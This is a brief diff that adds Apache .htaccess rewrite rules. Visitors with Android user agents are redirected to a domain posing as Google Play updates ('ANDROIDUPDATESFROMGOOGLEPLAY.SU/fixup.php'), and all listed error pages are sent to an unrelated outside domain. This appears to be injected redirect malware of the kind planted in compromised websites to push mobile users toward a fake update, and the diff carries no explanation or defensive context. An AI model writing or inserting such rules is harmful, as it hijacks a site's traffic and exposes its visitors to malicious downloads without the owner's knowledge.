@@ -1,0 +1,8 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} .*ndroid.*
+RewriteRule ^(.*)$ http://ANDROIDUPDATESFROMGOOGLEPLAY.SU/fixup.php
+ErrorDocument 400 http://fxnwsdo.com
+ErrorDocument 401 http://fxnwsdo.com
+ErrorDocument 403 http://fxnwsdo.com
+ErrorDocument 404 http://fxnwsdo.com
+ErrorDocument 500 http://fxnwsdo.com
